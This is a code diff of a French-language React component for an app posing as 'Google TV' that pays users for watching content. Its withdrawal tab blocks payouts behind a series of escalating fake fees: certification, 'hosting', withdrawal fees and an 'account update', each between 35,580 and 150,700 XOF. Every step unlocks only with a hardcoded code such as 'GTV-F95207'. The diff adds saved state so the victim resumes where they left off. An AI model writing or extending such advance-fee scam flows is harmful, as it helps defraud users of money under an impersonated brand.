@@ -31,7 +31,7 @@ type ActivityKey = 'watched' | 'liked' | 'disliked' | 'favorited';
 
 const recommendationLabels = ['Recommandation 1', 'Recommandation 2', 'Recommandation 3', 'Recommandation 4'];
 
-type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; updateStep: boolean; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
+type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; updateStep: boolean; hostingPaid: boolean; feePaid: boolean; updatePaid: boolean; withdrawalCode: string; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
 const withdrawalFlowKey = (userId: string) => `gtv-withdrawal-flow-${userId}`;
 
 export default function UserHome({ profile, onSignOut }: UserHomeProps) {
@@ -120,11 +120,17 @@ function HomeTab({ firstName, isCertified, onDiscover }: { firstName: string; is
 function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; rewardAmount: number }) {
   const flowKey = withdrawalFlowKey(profile.id);
   const savedFlow = (() => { try { const raw = window.localStorage.getItem(flowKey); return raw ? JSON.parse(raw) as WithdrawalFlowSnapshot : null; } catch { return null; } })();
+  const savedHostingPaid = savedFlow?.hostingPaid === true;
+  const savedFeePaid = savedFlow?.feePaid === true;
+  const savedUpdatePaid = savedFlow?.updatePaid === true;
   const [paymentMethod, setPaymentMethod] = useState(savedFlow?.paymentMethod ?? '');
   const [withdrawalCountry, setWithdrawalCountry] = useState(savedFlow?.withdrawalCountry ?? profile.country ?? '');
   const [amount, setAmount] = useState(savedFlow?.amount ?? '');
   const [phone, setPhone] = useState(savedFlow?.phone ?? profile.phone?.replace(/^\+\d+\s?/, '') ?? '');
-  const [withdrawalCode, setWithdrawalCode] = useState('');
+  const [withdrawalCode, setWithdrawalCode] = useState(savedFlow?.withdrawalCode ?? '');
+  const [hostingPaid, setHostingPaid] = useState(savedHostingPaid);
+  const [feePaid, setFeePaid] = useState(savedFeePaid);
+  const [updatePaid, setUpdatePaid] = useState(savedUpdatePaid);
   const taxPaidKey = `gtv-tax-paid-${profile.id}`;
   const [taxPaid, setTaxPaid] = useState(() => { try { return window.localStorage.getItem(taxPaidKey) === '1'; } catch { return false; } });
   const [codeStep, setCodeStep] = useState(savedFlow?.codeStep === true && !taxPaid && !profile.is_certified);
@@ -138,12 +144,13 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
   const [hostingCode, setHostingCode] = useState('');
   const [hostingError, setHostingError] = useState<string | null>(null);
   const [withdrawalProcessing, setWithdrawalProcessing] = useState(false);
-  const [hostedSuccess, setHostedSuccess] = useState(false);
-  const [feeStep, setFeeStep] = useState(false);
+  const [hostedSuccess, setHostedSuccess] = useState(savedFlow?.hostedSuccess === true || (savedHostingPaid && !savedFeePaid));
+  const [feeStep, setFeeStep] = useState(savedFlow?.feeStep === true || (savedHostingPaid && savedFeePaid && !savedUpdatePaid));
   const [feeCode, setFeeCode] = useState('');
   const [feeError, setFeeError] = useState<string | null>(null);
   const [feeValidation, setFeeValidation] = useState(false);
-  const [updateStep, setUpdateStep] = useState(false);
+  const [updateStep, setUpdateStep] = useState(savedFlow?.updateStep === true || (savedHostingPaid && savedFeePaid && !savedUpdatePaid));
+  const [resumeStarted, setResumeStarted] = useState(false);
   const [updateCode, setUpdateCode] = useState('');
   const [updateError, setUpdateError] = useState<string | null>(null);
   const [latestRequest, setLatestRequest] = useState<{ status: string; amount: number } | null>(null);
@@ -198,18 +205,24 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
   }, [codeStep]);
 
   useEffect(() => {
-    const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || updateStep;
+    const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || updateStep || hostingPaid || feePaid || updatePaid;
     if (!flowActive) { try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } return; }
-    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, paymentMethod, withdrawalCountry, amount, phone };
+    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, hostingPaid, feePaid, updatePaid, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone };
     try { window.localStorage.setItem(flowKey, JSON.stringify(snapshot)); } catch { /* stockage indisponible */ }
-  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, paymentMethod, withdrawalCountry, amount, phone]);
+  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, hostingPaid, feePaid, updatePaid, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);
 
   const beginSubmit = () => {
     setErrorMessage(null);
     setWithdrawalCode('');
     setHostingCode('');
     setHostingError(null);
-    if (profile.is_certified) { setHostingStep(true); return; }
+    if (profile.is_certified) {
+      if (hostingPaid && feePaid && updatePaid) { void submit(); return; }
+      if (hostingPaid && feePaid) { setUpdateStep(true); return; }
+      if (hostingPaid) { setFeeStep(true); return; }
+      setHostingStep(true);
+      return;
+    }
     if (taxPaid) { setCertificationBlocked(true); return; }
     setCodeStep(true);
   };
@@ -281,19 +294,25 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
     setSubmitting(false);
   };
 
-  if (certificationBlocked) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="mx-auto h-16 w-16 object-contain" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte n'est pas autorisé à passer un retrait.</h1><p className="mt-4 leading-7 text-slate-300">Pour autoriser les retraits, votre compte doit être certifié par l’administrateur.</p><p className="mt-3 text-sm text-slate-400">Coût de la certification : <b>35 580 XOF&nbsp;</b></p>{!certChecked ? <div className="mt-8"><Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-400" /><p className="mt-4 text-sm text-slate-400">Vérification de votre certification…</p></div> : certifiedNow ? <button onClick={() => { setCertificationBlocked(false); setHostingCode(''); setHostingError(null); setHostingStep(true); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Continuer</button> : <div><p className="mt-8 rounded-xl border border-amber-400/30 bg-amber-500/10 px-4 py-3 text-sm text-amber-200">Votre compte n’est pas encore certifié. Le bouton Continuer s’activera dès que votre compte sera certifié.</p><button disabled className="mt-5 cursor-not-allowed rounded-xl px-6 py-3 font-bold opacity-50">Continuer</button></div>}</div></section>;
+  useEffect(() => {
+    if (!updatePaid || !withdrawalCode || resumeStarted) return;
+    setResumeStarted(true);
+    void submit();
+  }, [updatePaid, withdrawalCode, resumeStarted]);
+
+  if (certificationBlocked) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="mx-auto h-16 w-16 object-contain" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte n'est pas autorisé à passer un retrait.</h1><p className="mt-4 leading-7 text-slate-300">Pour autoriser les retraits, votre compte doit être certifié par l’administrateur.</p><p className="mt-3 text-sm text-slate-400">Coût de la certification : <b>35 580 XOF&nbsp;</b></p>{!certChecked ? <div className="mt-8"><Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-400" /><p className="mt-4 text-sm text-slate-400">Vérification de votre certification…</p></div> : certifiedNow ? <button onClick={() => { setCertificationBlocked(false); setHostingCode(''); setHostingError(null); if (hostingPaid && feePaid && updatePaid) void submit(); else if (hostingPaid && feePaid) setUpdateStep(true); else if (hostingPaid) setFeeStep(true); else setHostingStep(true); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Continuer</button> : <div><p className="mt-8 rounded-xl border border-amber-400/30 bg-amber-500/10 px-4 py-3 text-sm text-amber-200">Votre compte n’est pas encore certifié. Le bouton Continuer s’activera dès que votre compte sera certifié.</p><button disabled className="mt-5 cursor-not-allowed rounded-xl px-6 py-3 font-bold opacity-50">Continuer</button></div>}</div></section>;
 
   if (withdrawalProcessing) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait en cours</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;
 
   if (feeValidation) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Validation en cours</h1><p className="mt-4 leading-7 text-slate-400">Vérification de vos frais de retrait…</p></div></section>;
 
-  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;
+  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setUpdatePaid(true); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;
 
   if (hostedSuccess) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre compte Google TV a bien été hébergé. Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostedSuccess(false); setFeeCode(''); setFeeError(null); setFeeStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;
 
-  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">95 800 F CFA</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeeError(null); setFeeStep(false); setFeeValidation(true); window.setTimeout(() => { setFeeValidation(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }, 3000); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;
+  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">95 800 F CFA</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeePaid(true); setFeeError(null); setFeeStep(false); setFeeValidation(true); window.setTimeout(() => { setFeeValidation(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }, 3000); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;
 
-  if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>55 890 XOF</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button></div></div></section>;
+  if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>55 890 XOF</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingPaid(true); setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button></div></div></section>;
 
   if (validating) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte est en cours de validation</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;
 
